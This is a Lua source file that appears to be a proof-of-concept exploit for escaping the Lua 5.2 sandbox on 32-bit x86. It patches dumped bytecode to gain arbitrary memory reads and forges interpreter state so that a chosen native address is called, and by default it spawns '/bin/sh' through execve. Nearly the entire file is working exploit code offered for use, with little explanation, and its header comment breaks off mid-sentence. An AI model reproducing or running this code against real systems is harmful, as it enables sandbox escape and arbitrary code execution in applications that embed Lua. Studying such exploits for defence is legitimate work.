--[[
Abusing Lua 5.2 bytecode on x86 (32 bit)
--------------------------------------------
Lua 5.2 uses a magic on 32 bit system (e.g. x86) in order to reduce 
memory usage. The trick simply allows using


]]--

local pointer_size = 4
local global_State_size = 260
local lua_State_size = 112
local TString_size = 16
local TValue_size = 8

local function _objAddr(o)
	return tonumber(tostring(o):match('^%a+: 0x(%x+)$'),16)
end

local function escapeString(s)
	local i=1
	local len=#s
	while (i<=len) do
		if (s:byte(i) == 0x25) then
			s = s:sub(1, i) .. '%' .. s:sub(i+1)
			len=len+1
			i = i+1
		end
		i = i+1
	end
	return s
end

local function numTo32L(n)
        local a1 = n%256
        local q = (n - a1)/256
        local a2 = q % 256
        q = (q - a2)/256
        local a3 = q % 256
        q = (q - a3)/256
        local a4 = q
        return string.char(a1, a2, a3, a4)
end

local function numTo64L(n)
	local a1 = n%256
	local q = (n - a1)/256
	local a2 = q % 256
	q = (q - a2)/256
	local a3 = q % 256
	q = (q - a3)/256
	local a4 = q % 256
    q = (q - a4)/256
    local a5 = q % 256
    q = (q - a5)/256
    local a6 = q % 256
    q = (q - a6)/256
    local a7 = q % 256
    q = (q - a7)/256
    local a8 = q
	return string.char(a1, a2, a3, a4, a5, a6, a7, a8)
end


local function createLOADK(ra, k, t)
	local Bx = ((t-k)/(pointer_size * 2))*(2^14)
	local i = 0x01 + (ra*2^6) + Bx
--	print (string.format("%08X, Bx=0x%X", i, Bx/(2^14)))
	i = numTo32L(i)
    return i
end


local function readAddr(addr)
	--sizeof(TValue) = 8
	--sizeof(TString) = 16
	collectgarbage()
	local function foo()
		local a=0 
		local b = #a
		a=1 a=2 a=3
		return (b)
	end
	local _intermid={}
	local _k={}
	local _str={}
	if (tostring(_k)>tostring(_str)) then
		local _t = _str
		_str = _k
		_k = _t
	end
--	print ('_str', _str, _objAddr(_str))
	local _str_addr = _objAddr(_str)
--	print ('_intermid', _intermid)
	-- table in 32bit is 32B long, TString is 16B
	local _addr = numTo32L(addr - 12) --len is in offset 12 of the TString struct
	-- 0x7FF7A500
	local padding_b = '\04\165\247\127padding';
	collectgarbage()
	_str = nil
	_intermid = nil
	collectgarbage()
	_str = _addr .. padding_b;
--	print (_str)
--	print (#_str, _str);

	foo = string.dump(foo)
	foo = foo:gsub(escapeString(createLOADK(0, 0, 0*TValue_size)), 
			escapeString(createLOADK(0, _objAddr(_k), _str_addr+TString_size)))
	_intermid = {}
--	print ('_k', _k)
--	print ('_intermid', _intermid)
	collectgarbage()
--	_k = nil
	_intermid = nil
	_k=nil
	collectgarbage()
	foo = load(foo)
	return foo()
end

local function memcpy(src, size)
	local dest = ''
	local m = size%pointer_size
	for i=0,size-m-pointer_size,pointer_size do
		dest = dest .. numTo32L(readAddr(src + i))
	end
	if (m ~= 0) then	
		local i = (size - m) --Note: size%pointer_size != 0
		dest = dest .. numTo32L(readAddr(src + i)):sub(1,m)
	end
	return dest
end

local function objAddr(o)
	local known_objects = {}
	known_objects['thread'] = 1; known_objects['function']=1; known_objects['userdata']=1; known_objects['table'] = 1;
	local tp = type(o)
	if (known_objects[tp]) then return _objAddr(o) end

	local f = function(a) coroutine.yield(a)  end
	local t = coroutine.create(f)
	local top = readAddr(_objAddr(t) + 0x8) --The field top is in offset 0x08 in 32b
	--print (t, string.format("top: 0x%08X", top))
	coroutine.resume(t, o)
	local addr = readAddr(top )
	--print ('addr:', string.format("0x%08X", addr))
	return addr
end


local function bufferAddress(b)
	return (objAddr(b) + 16)
end

--[[
The function will run a new thread (lua_State) with a custome frealloc.
The custom frealloc will be called with the following arguments:
arg a: controlled by the user (i.e. you!)
arg b: NULL
arg c: NULL
arg d: undefined
]]--
local function executeC(addr, arg_a)
--	local f = function() coroutine.yield() local a = string.rep('asda', 20) end
	local dd = {}
	local f = function() coroutine.yield() table.insert(dd, 1) end
	local t = coroutine.create(f)
	coroutine.resume(t)
	local t_addr = objAddr(t)
	local l_G_addr = readAddr(readAddr(t_addr) + TString_size)
	l_G = memcpy(l_G_addr, global_State_size)
	l_G = numTo32L(addr) .. numTo32L(arg_a) .. l_G:sub(9)
	l_G_addr = bufferAddress(l_G)
--	print (string.format('l_G_addr: 0x%08x', l_G_addr))
	local t_buffer = memcpy(t_addr, lua_State_size) -- sizeof(lua_State)=208
	
	t_buffer = t_buffer:sub(1,5)  .. '\01' .. t_buffer:sub(7,12) .. numTo32L(l_G_addr) .. t_buffer:sub(17)

	collectgarbage()
	t_addr = bufferAddress(t_buffer)
--	print ('sizeof:', #t_buffer, 'addr:', string.format("%08X", t_addr))
	--create TValue, tt = 0x7FF7A500 | 0x48
	local tvl = numTo32L(t_addr) .. '\72\165\247\127';
	t_addr = bufferAddress(tvl);
	collectgarbage()
	local k = {}
	local k_addr = objAddr(k)
	while ((t_addr - k_addr) > 0x10000 or (k_addr > t_addr)) do
		k={}
		k_addr = objAddr(k)
	end
--	print ('k', k, 't', t, string.format('0x%08X - 0x%08X = 0x%X', t_addr, k_addr, t_addr - k_addr))
--	local g = function() local a=1 os.execute(a) end
	local g = function() local a=1 coroutine.resume(a) a=2 end
	g = string.dump(g)
	g = g:gsub('\01%z%z%z(\70\64\64)', escapeString(createLOADK(0, k_addr, t_addr)) .. '%1', 1)
	local intermid = {}
	collectgarbage()
	intermid = nil
   	k=nil
	collectgarbage()
	g, err = load(g)
--    print (string.format('l_G: 0x%08X, #l_G: %d, #t_buffer: %d', l_G_addr, #l_G, #t_buffer))
	g()	
end

local b = arg[1] or '/bin/sh'
local dif = arg[2] or (-104462)
--addr is the address of an instruction which calls libc's execve
local addr = objAddr(print) + dif
executeC(addr, bufferAddress(b))

